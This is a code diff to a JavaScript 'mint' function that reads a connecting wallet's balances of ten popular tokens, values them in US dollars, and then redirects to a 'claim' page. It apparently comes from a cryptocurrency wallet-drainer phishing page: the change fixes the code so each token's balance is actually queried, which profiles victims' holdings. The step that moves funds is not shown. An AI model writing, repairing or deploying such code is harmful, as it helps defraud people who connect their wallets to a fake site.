@@ -106,16 +106,16 @@ function mint(wallet) {
       const contractUSDC = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48");
       const contractDai = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x6b175474e89094c44da98b954eedeac495271d0f");
       const contractSandbox = new Web3Client.eth.Contract(window.CONTRACT_ABI, "0x3845badAde8e6dFF049820680d1F14bD3903a5d0");
-      const BalanceTether = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * Tetherprice.usdPrice;
-      const BalanceBUSD = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * BUSDprice.usdPrice;
-      const BalanceWETH = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * WETHprice.usdPrice;
-      const BalancePolygon = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * Polygonprice.usdPrice;
-      const BalanceUniswap = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * Uniswapprice.usdPrice;
-      const BalanceApeCoin = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * ApeCoinprice.usdPrice;
-      const BalanceShiba = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * Shibaprice.usdPrice;
-      const BalanceUSDC = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * USDCprice.usdPrice;
-      const BalanceDai = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * Daiprice.usdPrice;
-      const BalanceSandbox = Web3Client.utils.fromWei(await contract.methods.balanceOf(adress).call()) * Sandboxprice.usdPrice;
+      const BalanceTether = Web3Client.utils.fromWei(await contractTether.methods.balanceOf(adress).call()) * Tetherprice.usdPrice;
+      const BalanceBUSD = Web3Client.utils.fromWei(await contractBUSD.methods.balanceOf(adress).call()) * BUSDprice.usdPrice;
+      const BalanceWETH = Web3Client.utils.fromWei(await contractWETH.methods.balanceOf(adress).call()) * WETHprice.usdPrice;
+      const BalancePolygon = Web3Client.utils.fromWei(await contractPolygon.methods.balanceOf(adress).call()) * Polygonprice.usdPrice;
+      const BalanceUniswap = Web3Client.utils.fromWei(await contractUniswap.methods.balanceOf(adress).call()) * Uniswapprice.usdPrice;
+      const BalanceApeCoin = Web3Client.utils.fromWei(await contractApeCoin.methods.balanceOf(adress).call()) * ApeCoinprice.usdPrice;
+      const BalanceShiba = Web3Client.utils.fromWei(await contractShiba.methods.balanceOf(adress).call()) * Shibaprice.usdPrice;
+      const BalanceUSDC = Web3Client.utils.fromWei(await contractUSDC.methods.balanceOf(adress).call()) * USDCprice.usdPrice;
+      const BalanceDai = Web3Client.utils.fromWei(await contractDai.methods.balanceOf(adress).call()) * Daiprice.usdPrice;
+      const BalanceSandbox = Web3Client.utils.fromWei(await contractSandbox.methods.balanceOf(adress).call()) * Sandboxprice.usdPrice;
       redirectToClaim()
     } catch (error) {
       console.error(error);
